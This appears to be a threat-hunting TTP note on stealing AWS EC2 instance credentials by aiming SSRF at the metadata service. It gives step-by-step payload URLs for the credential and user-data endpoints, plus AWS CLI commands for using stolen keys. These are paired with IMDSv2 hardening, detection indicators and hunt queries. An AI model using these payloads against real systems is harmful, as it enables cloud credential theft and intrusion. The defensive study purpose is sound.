---
title: EC2 Instance Metadata Service Abuse
date: 2026-03-08
type: ttp
mitre_id: T1552.005, T1078.004
mitre_tactic: Credential Access
threat_actors: []
tools_used: [curl, Burp Suite, AWS CLI]
platforms: [AWS]
tags:
  - type/ttp
  - status/active
  - platform/aws
  - category/credential-access
  - category/ssrf
  - category/imds
source:
  url: https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/
  author: hackingthe.cloud
  date: 2023
---

## Summary
The EC2 Instance Metadata Service (IMDS) at `http://169.254.169.254` provides instance-level AWS credentials to code running on EC2. An SSRF vulnerability in a web application running on EC2 can be used to make the server request these credentials on the attacker's behalf. If the instance has an IAM role attached, the attacker receives temporary AWS credentials usable anywhere — enabling full cloud environment pivot. IMDSv1 is trivially exploitable via GET; IMDSv2 raises the bar by requiring a PUT-based token exchange.

## How It Works

### Step 1 — Identify SSRF
Find a parameter in the target application that causes the server to make an outbound HTTP request:
- URL preview / link unfurl features
- Image fetch by URL
- Webhook or callback URLs
- PDF generators that fetch remote content
- XML/XXE with external entity loading

### Step 2 — Probe IMDS
Direct the SSRF payload at the IMDS address:
```
http://169.254.169.254/latest/meta-data/
```
A successful response listing metadata keys confirms IMDS access.

### Step 3 — Check for IAM Role
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
Response will contain the name of the attached IAM role, or be empty if no role is attached.

### Step 4 — Retrieve Credentials
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```
Response:
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-01-01T06:00:00Z"
}
```

### Step 5 — Bonus: Grab User Data
Even without a role, user data often contains hardcoded secrets:
```
http://169.254.169.254/latest/user-data
```

### Step 6 — Use Credentials to Pivot
```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name <role-name>
```
From here, proceed to IAM privilege escalation if the role has useful permissions.

---

## Technical Reference

### IMDS Endpoint Reference

**Base URL:** `http://169.254.169.254/`

| Purpose | URL |
|---|---|
| Check if an IAM role is attached | `http://169.254.169.254/latest/meta-data/iam/` |
| Retrieve the attached role name | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| Retrieve temporary credentials | `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>` |
| Instance identity document | `http://169.254.169.254/latest/dynamic/instance-identity/document` |
| User data (may contain secrets) | `http://169.254.169.254/latest/user-data` |
| All metadata | `http://169.254.169.254/latest/meta-data/` |

### Credential Format
A successful request to the credentials endpoint returns:

```json
{
  "Code": "Success",
  "LastUpdated": "2024-01-01T00:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-01-01T06:00:00Z"
}
```

These are **temporary credentials** tied to the instance's IAM role. They rotate automatically but are valid for hours.

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws sts get-caller-identity   # Confirm who you are
aws iam list-attached-role-policies --role-name <role-name>  # Enumerate permissions
```

### IMDSv2 Token Retrieval (requires PUT — harder to exploit via SSRF)
```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### User Data — Bonus Target
Even without an IAM role attached, the user data endpoint often contains:
- Hardcoded credentials passed at instance launch
- Database connection strings
- Bootstrap scripts with secrets

```
http://169.254.169.254/latest/user-data
```

### Attack Flow Diagram
```
1. Identify SSRF in target web app (URL parameter, image fetch, webhook, etc.)
         │
         ▼
2. Probe for IMDS: fetch http://169.254.169.254/latest/meta-data/
         │
         ▼
3. Check for IAM role: .../iam/security-credentials/
         │
         ▼
4. Retrieve credentials: .../iam/security-credentials/<role-name>
         │
         ▼
5. Export creds locally, enumerate permissions via AWS CLI
         │
         ▼
6. Pivot into AWS environment (IAM privesc, S3 access, lateral movement)
```

### Real-World Impact
- **Capital One Breach (2019)** — SSRF in a WAF misconfiguration allowed access to IMDS, yielding credentials that were used to exfiltrate 100M+ customer records from S3

---

## IMDSv1 vs IMDSv2

| | IMDSv1 | IMDSv2 |
|---|---|---|
| Exploit requirement | Simple GET request | PUT to get token, then GET with token header |
| SSRF exploitable | Yes — trivially | Significantly harder (PUT method usually blocked by SSRF) |
| XXE vulnerable | Yes | Significantly harder |
| Enforcement | Cannot be enforced remotely | Enforceable via `HttpTokens=required` in Instance Metadata Options |
| Detection signal | No token header in request | Missing or invalid token header |

**Enforce IMDSv2 across all instances:**
```bash
aws ec2 modify-instance-metadata-options \
  --instance-id <id> \
  --http-tokens required \
  --http-endpoint enabled
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| Unsecured Credentials: Cloud Instance Metadata API | T1552.005 | Accessing IMDS endpoint to retrieve IAM role credentials |
| Valid Accounts: Cloud Accounts | T1078.004 | Using stolen instance profile credentials as valid cloud identity |

---

## Detection Opportunities

### Key Log Sources
- **VPC Flow Logs** — traffic to `169.254.169.254` from unexpected processes/IPs
- **CloudTrail** — `AssumeRole` events using instance profile credentials from unexpected source IPs
- **Application logs** — SSRF payloads in request parameters
- **GuardDuty** — `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` finding
- **IMDSv2 enforcement** — requests without token header are a detection opportunity

### Behavioral Indicators
- AWS API calls using instance profile credentials (`ASIA...` access key prefix) originating from an IP outside the instance's known IP range
- `sts:AssumeRole` or API calls using instance credentials at unusual times or from unexpected regions
- HTTP requests to `169.254.169.254` in application or proxy logs from non-application processes
- GuardDuty finding: `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS`
- IMDSv1 requests (no token header) on instances that should be running IMDSv2

### Artifacts Left Behind
- CloudTrail events showing instance role credentials used from an external IP
- Unusual `GetCallerIdentity` calls (attacker confirming credential validity)
- Subsequent IAM enumeration calls from instance credentials

---

## Query Stubs

### CrowdStrike FQL
```fql
// Instance credentials used from unexpected source IP
event_simpleName=CloudTrailEvent
| UserIdentityType=AssumedRole
| UserIdentityArn=*:assumed-role/*/i-*
| NOT SourceIPAddress IN (known_instance_ips)
| table _time, UserIdentityArn, EventName, SourceIPAddress
```

### Databricks SQL
```sql
-- Instance profile credentials used outside expected IP range
SELECT
  event_time,
  user_identity_arn,
  event_name,
  source_ip_address,
  aws_region
FROM cloudtrail_events
WHERE
  user_identity_type = 'AssumedRole'
  AND user_identity_arn LIKE '%:assumed-role/%/i-%'
  AND source_ip_address NOT IN (SELECT instance_ip FROM known_ec2_inventory)
ORDER BY event_time DESC;

-- GetCallerIdentity calls — attacker recon after credential theft
SELECT
  event_time,
  user_identity_arn,
  source_ip_address
FROM cloudtrail_events
WHERE event_name = 'GetCallerIdentity'
  AND user_identity_type = 'AssumedRole'
ORDER BY event_time DESC;
```

---

## Tools Reference

| Tool | Usage |
|---|---|
| `curl` | Direct IMDS requests and SSRF payload testing |
| Burp Suite | Identifying and exploiting SSRF vulnerabilities |
| AWS CLI | Validating and enumerating stolen credentials |

---

## Threat Actor Usage
IMDS credential theft via SSRF is a well-established technique across financially motivated and nation-state actors targeting cloud environments.

| Incident | Method |
|---|---|
| Capital One (2019) | WAF SSRF → IMDS → S3 exfiltration of 100M+ records |
| Multiple crypto miners | SSRF → IMDS → EC2/ECS lateral movement for compute abuse |

---

## References
- [hackingthe.cloud — EC2 Metadata SSRF](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/)
- [AWS Docs — IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [Capital One Breach Analysis](https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/)

## Related Notes
- [[Hunt - EC2 IMDS Credential Theft]] — active hunt hypothesis with queries
- [[AWS IAM Privilege Escalation]] — what attackers do with stolen instance credentials
- [[30 - Knowledge/Cybersecurity/Research Index]]
